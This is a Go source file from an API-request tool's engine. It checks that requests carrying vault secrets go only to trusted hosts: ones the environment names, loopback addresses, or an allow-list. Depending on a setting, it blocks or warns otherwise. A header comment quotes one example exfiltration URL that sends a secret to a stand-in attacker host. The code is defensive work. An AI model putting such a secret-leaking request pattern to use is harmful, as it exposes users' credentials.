// SPDX-License-Identifier: Apache-2.0

package engine

import (
	"net"
	"slices"
	"strings"

	"github.com/githugt/flowi/lib/diag"
	"github.com/githugt/flowi/lib/transport"
)

// Where a secret may go. A collection is code from whoever wrote it: it can put {{secret.token}} in a header of a
// request to any host, and the vault would fill it in. So before a request leaves, if what it carries holds a secret
// value read in this run, its host must be one the user trusts: a host named by a variable of the selected
// environment (the user's own file, with the base URL they chose), a loopback address, or one the user allowed in
// the personal setting secrets.allowed_hosts. The setting secrets.host_check says what happens otherwise: block
// (the default) stops the send, warn sends it with a warning, off does not check.
// Before: a cloned collection with `https://evil.example/?k={{secret.x}}` sent the real secret there, and CI that
// runs pull-request collections would do the same unattended.

// Modes of secrets.host_check.
const (
	hostCheckOff   = "off"
	hostCheckWarn  = "warn"
	hostCheckBlock = "block"
)

// checkSecretDestination is false (and the execution has failed) when the send must not go: it carries a secret to
// a host that is not trusted and the mode is block. In warn mode it adds a warning and lets it go. host is the
// address as built (a URL, or a broker address); texts are everything else that goes out with it.
func (x *execution) checkSecretDestination(host string, texts ...string) bool {
	if x.cfg.secretHosts == hostCheckOff {
		return true
	}
	masker := x.r.secrets.current()
	carries := false
	for _, t := range append([]string{host}, texts...) {
		if t != "" && masker.String(t) != t {
			carries = true
			break
		}
	}
	if !carries {
		return true
	}
	untrusted := x.untrustedHosts(hostsOf(host))
	if len(untrusted) == 0 {
		return true
	}
	d := diag.New(diag.CodeSecretHost, diag.Location{}, map[string]string{
		"host": strings.Join(untrusted, ", "), "env": x.envLabel(), "request": x.c.request.Path,
	})
	if x.cfg.secretHosts != hostCheckBlock {
		d.Severity = diag.SeverityWarning
		x.mu.Lock()
		x.diags = append(x.diags, d)
		x.mu.Unlock()
		return true
	}
	x.fail(StatusError, diag.List{d})
	return false
}

func (x *execution) envLabel() string {
	if x.env.name == "" {
		return "(none)"
	}
	return x.env.name
}

// checkHTTPSecretDestination is checkSecretDestination for a built HTTP request: its URL, headers and in-memory body.
func (x *execution) checkHTTPSecretDestination(b built) bool {
	texts := []string{b.bodyText}
	for _, values := range b.request.Header {
		texts = append(texts, values...)
	}
	for _, p := range b.parts {
		texts = append(texts, p.Value)
	}
	return x.checkSecretDestination(b.request.URL, texts...)
}

// checkAsyncSecretDestination is checkSecretDestination for a built message request.
func (x *execution) checkAsyncSecretDestination(op transport.Operation) bool {
	texts := []string{op.Channel}
	for _, h := range op.Headers {
		texts = append(texts, h.Value)
	}
	for _, v := range op.Binding {
		texts = append(texts, v)
	}
	if op.Send != nil {
		texts = append(texts, string(op.Send.Body))
		for _, h := range op.Send.Headers {
			texts = append(texts, h.Value)
		}
	}
	return x.checkSecretDestination(op.Server, texts...)
}

// untrustedHosts are the hosts among hosts that this execution may not send secrets to, as written.
func (x *execution) untrustedHosts(hosts []string) []string {
	trusted := hostsOfValues(x.env.values)
	var out []string
	for _, h := range hosts {
		if !trustedHost(h, trusted, x.cfg.secretAllowed) && !slices.Contains(out, h) {
			out = append(out, h)
		}
	}
	return out
}

// hostsOf is the hosts a server or URL names, lower case with the port: "kafka://a:9092,b:9092" names two. Text
// that names no host (an empty server: the cloud service itself) names none.
func hostsOf(server string) []string {
	server = strings.TrimSpace(server)
	if server == "" {
		return nil
	}
	if !strings.Contains(server, "://") {
		server = "x://" + server
	}
	_, rest, _ := strings.Cut(server, "://")
	authority, _, _ := strings.Cut(rest, "/")
	authority, _, _ = strings.Cut(authority, "?")
	if at := strings.LastIndex(authority, "@"); at >= 0 {
		authority = authority[at+1:] // credentials in the address are not the host
	}
	var out []string
	for _, part := range strings.Split(authority, ",") {
		if part = strings.ToLower(strings.TrimSpace(part)); part != "" {
			out = append(out, part)
		}
	}
	return out
}

// hostsOfValues are the hosts of every value of the environment that is an address (has a scheme), nested ones
// included, without ports: an environment that names https://api.example.com trusts the host, whatever its port.
func hostsOfValues(values map[string]any) []string {
	var out []string
	var walk func(v any)
	walk = func(v any) {
		switch t := v.(type) {
		case string:
			if strings.Contains(t, "://") {
				for _, h := range hostsOf(t) {
					out = append(out, bareHost(h))
				}
			}
		case map[string]any:
			for _, e := range t {
				walk(e)
			}
		case []any:
			for _, e := range t {
				walk(e)
			}
		}
	}
	walk(values)
	return out
}

// bareHost is host without its port; an IPv6 literal keeps its brackets off.
func bareHost(hostport string) string {
	if h, _, err := net.SplitHostPort(hostport); err == nil {
		return h
	}
	return strings.Trim(hostport, "[]")
}

// trustedHost says whether secrets may go to host (lower case, with a port when one was written): a loopback
// address; a host the environment names; or an entry of the allowed list: "api.example.com" (any port),
// "api.example.com:8443" (that port only) or "*.example.com" (any subdomain, not example.com itself).
func trustedHost(host string, environment, allowed []string) bool {
	name := bareHost(host)
	if name == "localhost" || strings.HasSuffix(name, ".localhost") {
		return true
	}
	if ip := net.ParseIP(name); ip != nil && ip.IsLoopback() {
		return true
	}
	if slices.Contains(environment, name) {
		return true
	}
	for _, a := range allowed {
		a = strings.ToLower(strings.TrimSpace(a))
		switch {
		case a == "":
		case a == host || a == name:
			return true
		case strings.HasPrefix(a, "*."):
			if strings.HasSuffix(name, a[1:]) {
				return true
			}
		}
	}
	return false
}
